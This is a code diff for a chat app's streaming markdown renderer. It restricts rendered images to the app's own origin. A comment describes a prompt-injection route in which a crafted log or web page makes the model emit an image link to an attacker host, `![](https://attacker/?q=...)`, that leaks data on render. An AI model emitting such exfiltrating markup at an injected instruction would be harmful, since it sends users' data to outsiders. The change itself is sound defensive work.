@@ -4,6 +4,8 @@ import type { Components } from "streamdown";
 import { rehypeWordSpans } from "../lib/rehypeWordSpans";
 import { useSmoothText } from "../hooks/useSmoothText";
 
+type PluginTuple = Extract<(typeof defaultRehypePlugins)[string], unknown[]>;
+
 /**
  * US6 streaming renderer (replaces the old react-markdown `Markdown`).
  *
@@ -15,10 +17,29 @@ import { useSmoothText } from "../hooks/useSmoothText";
  *  - new-tab links (US1/FR-003) so clicking a Warcraft Logs source never loses chat state.
  */
 
-// Streamdown's defaults, plus our word-span plugin for the live reply (passing
-// rehypePlugins replaces the defaults). Finished messages skip the per-word spans: the
-// ink-in has already played, and a span per word is costly on long answers (PERF-010).
-const STATIC_REHYPE_PLUGINS = Object.values(defaultRehypePlugins);
+// sc-157 (QA SEC-003): Streamdown's harden step allows every image by default, so a crafted
+// log or web page could make the model emit `![](https://attacker/?q=...)` and leak data the
+// moment it renders. We re-run harden with images limited to this origin; anything else
+// becomes a "[Image blocked: alt]" text span. (`data:` images were already dropped by
+// Streamdown's URL transform, and the app emits none.) Links keep the default (any
+// http/https), since they need a click.
+const ORIGIN = window.location.origin;
+const [harden] = defaultRehypePlugins.harden as PluginTuple;
+const HARDEN: PluginTuple = [
+  harden,
+  {
+    defaultOrigin: ORIGIN,
+    allowedImagePrefixes: [ORIGIN],
+    allowedLinkPrefixes: ["*"],
+    allowedProtocols: ["*"],
+    blockedImageClass: "text-muted-foreground",
+  },
+];
+
+// Streamdown's defaults (with our harden), plus our word-span plugin for the live reply
+// (passing rehypePlugins replaces the defaults). Finished messages skip the per-word spans:
+// the ink-in has already played, and a span per word is costly on long answers (PERF-010).
+const STATIC_REHYPE_PLUGINS = Object.values({ ...defaultRehypePlugins, harden: HARDEN });
 const STREAMING_REHYPE_PLUGINS = [...STATIC_REHYPE_PLUGINS, rehypeWordSpans];
 
 // PERF-011: KaTeX loads on demand, the first time any reply contains math (US3).
